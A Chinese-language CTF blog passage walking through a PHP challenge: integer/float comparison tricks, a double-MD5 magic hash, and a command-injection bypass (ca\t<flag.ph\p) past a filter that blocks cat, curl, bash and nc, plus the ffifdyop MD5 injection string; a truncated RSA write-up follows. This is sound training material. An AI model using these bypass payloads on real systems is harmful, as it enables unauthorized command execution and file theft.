<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$len</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$k</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$len</span>/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="variable">$k</span>;<span class="variable">$j</span>++)</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="variable">$j</span>,<span class="number">1</span>)!=<span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="variable">$len</span>-<span class="variable">$j</span>-<span class="number">1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="variable">$l</span>=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$l</span>==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="variable">$numPositve</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$numReverse</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$num</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^0-9.]/&#x27;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你1&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\./&quot;</span>, <span class="variable">$num</span>) &gt; <span class="number">1</span>) || (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\-/&quot;</span>, <span class="variable">$num</span>) &gt; <span class="number">1</span>) || (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\-/&quot;</span>, <span class="variable">$num</span>)==<span class="number">1</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[-]/&#x27;</span>, <span class="variable">$num</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;没有这样的数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="variable">$numPositve</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numPositve</span> &lt;= -<span class="number">999999999999999999</span> || <span class="variable">$numPositve</span> &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$numPositve</span> === <span class="variable">$numReverse</span> &amp;&amp; !<span class="title function_ invoke__">isPalindrome</span>(<span class="variable">$num</span>) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[&#x27;\*\&quot;[?]/&quot;</span>, <span class="variable">$get_flag</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;非预期修复*2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">去非洲吧</span><br></pre></td></tr></table></figure>

<p>分为三层绕过：</p>
<p>第一层;</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="variable">$numPositve</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$numReverse</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$num</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^0-9.]/&#x27;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你1&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\./&quot;</span>, <span class="variable">$num</span>) &gt; <span class="number">1</span>) || (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\-/&quot;</span>, <span class="variable">$num</span>) &gt; <span class="number">1</span>) || (<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/\-/&quot;</span>, <span class="variable">$num</span>)==<span class="number">1</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[-]/&#x27;</span>, <span class="variable">$num</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;没有这样的数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="variable">$numPositve</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numPositve</span> &lt;= -<span class="number">999999999999999999</span> || <span class="variable">$numPositve</span> &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$numPositve</span> === <span class="variable">$numReverse</span> &amp;&amp; !<span class="title function_ invoke__">isPalindrome</span>(<span class="variable">$num</span>) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先通过get传参一个变量    num   然后</p>
<p>$numPositve &#x3D; intval($num);<br>$numReverse &#x3D; intval(strrev($num));</p>
<p>strrev()函数   实现字符串反转</p>
<p>最终要实现绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="variable">$numPositve</span> === <span class="variable">$numReverse</span> &amp;&amp; !<span class="title function_ invoke__">isPalindrome</span>(<span class="variable">$num</span>) )</span><br></pre></td></tr></table></figure>

<p>numpositve  与   numreverse   强相等   isPalindrome  函数判断num反转后是否与原来相等  </p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=100.0010</span><br></pre></td></tr></table></figure>

<p>这样就绕过了    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )   但是   发现没有绕过  $num !&#x3D; $numPositve               num 是一个字符串    而  numpositive  是一个数字</p>
<p>可以发现，这里使用了不严格判断，也就是俩等号，这样的话就可以使用浮点精度来绕过</p>
<p><img src="/2023/02/02/md5%E7%BB%95%E8%BF%87/1662023542462.png" alt="1662023542462"></p>
<p>所以可以构造一个   精度更长的浮点数来进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1000000000000000.00000000000000010</span><br></pre></td></tr></table></figure>

<p>这样就实现了绕过</p>
<p>第二层：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>首先通过get传参   传入 md5参数    然后md5这个变量经过   md5两次加密后的值与原来相等  </p>
<p>$md5&#x3D;&#x3D;md5(md5($md5))</p>
<p>跑脚本得出一个</p>
<p>0e1138100474</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1000000000000000.00000000000000010&amp;md5=0e1138100474</span><br></pre></td></tr></table></figure>

<p>实现第二层绕过</p>
<p>第三层</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[&#x27;\*\&quot;[?]/&quot;</span>, <span class="variable">$get_flag</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;非预期修复*2&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br></pre></td></tr></table></figure>

<p>由最后一行   system可得最后应该也是通过   远程命令执行  来实现绕过</p>
<p>发现好多东西都被过滤掉了   可以尝试用    \    尝试绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1000000000000000.00000000000000010&amp;md5=0e1138100474&amp;get_flag=ca\t flag.ph\p</span><br></pre></td></tr></table></figure>

<p>发现不行   可能是空格也被过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=1000000000000000.00000000000000010&amp;md5=0e1138100474&amp;get_flag=ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure>

<p>然后就实现了绕过</p>
<h1 id="6-MD5-true参数漏洞"><a href="#6-MD5-true参数漏洞" class="headerlink" title="6.MD5()true参数漏洞"></a>6.MD5()true参数漏洞</h1><p>ffifdyop字符串会造成漏洞</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/md5/" rel="tag">md5</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-UUCTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/02/01/UUCTF/"
    >2022UUCTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/02/01/UUCTF/" class="article-date">
  <time datetime="2023-02-01T07:59:04.000Z" itemprop="datePublished">2023-02-01</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="unsafe-prime"><a href="#unsafe-prime" class="headerlink" title="unsafe_prime"></a>unsafe_prime</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="comment"># from flag import flag</span></span><br><span class="line"><span class="comment"># import libnum</span></span><br><span class="line"><span class="comment"># p=getPrime(1024)</span></span><br><span class="line"><span class="comment"># n=p**3</span></span><br><span class="line"><span class="comment"># e=65537</span></span><br><span class="line"><span class="comment"># c=pow(libnum.s2n(flag),e,n)</span></span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment">#1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span></span><br><span class="line"><span class="comment">#1402371150275079475353867962992356093684205278224746766691813462864343871795075217989508355749642716635931824907174189358797217546624305634264458802157933311315419673854405865092102322247505412453586251582022669511221048298234732642016439123525455296325766292112758881774720932499142635136210314142144509741404827421282969081272484330382868174392651681290127032351489627054643864671335712011990584326951285867375878235135547391155357814807654366986019707719726796289990920154227959213228064918435259919697047405788311280560319520593639968900649500117511665741073545430999580686455996145426173603547052710181735901020361145546892741579951501409108067297139928103329203429485237575169217432586580425019729120741661192297552519858305628835738911159460615968385837687234565509200392302553443089729906970894661310333276852803980265040679214814192141779678148895736682538612828771031493541256243879854624644771924477873876038496224</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">1781066779141074297846071955037887396311182371062305797790413639302252321886055189043670187843106208315282055227397316083218930657040969292641990094428330517286511511741846106485971830443788363541411679523274683568732340113625424593194464460018629545968907529693143364870519531630721083893407011154181539445417439610805148961135948617691115328261432541033785402520757881586489819563221498111411690769065511011083021336493731421274742041131952523427183184133413677315203810963447656037908287875212013900845740870561508870574734100843624059414134156975073835607712519402938132401964708681236647568922173471703538744207491065165405594141287750705055447493380970194312139898574699147098202027540057477562090764694370368571887563631557761911842054442637038169316686266784299889397326811768646649462480349219937292894824766045607723468654723947999531346474969019631500665628522355198334827965770037487344994396753505248472283247731</span></span><br><span class="line">c = <span 